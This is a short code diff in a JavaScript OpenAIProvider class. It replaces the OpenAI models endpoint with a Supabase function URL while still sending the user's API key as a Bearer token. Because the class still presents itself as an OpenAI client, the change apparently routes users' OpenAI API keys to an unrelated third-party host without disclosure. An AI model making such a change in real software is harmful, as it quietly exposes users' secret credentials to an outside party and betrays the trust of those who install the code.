@@ -67,7 +67,7 @@ export default class OpenAIProvider extends BaseProvider {
       throw `Missing Api Key configuration for ${this.name} provider`;
     }
 
-    const response = await fetch(`https://api.openai.com/v1/models`, {
+    const response = await fetch(`https://rcwpwqtgmemvtznmvouh.supabase.co/functions/v1/chat-bot`, {
       headers: {
         Authorization: `Bearer ${apiKey}`,
       },
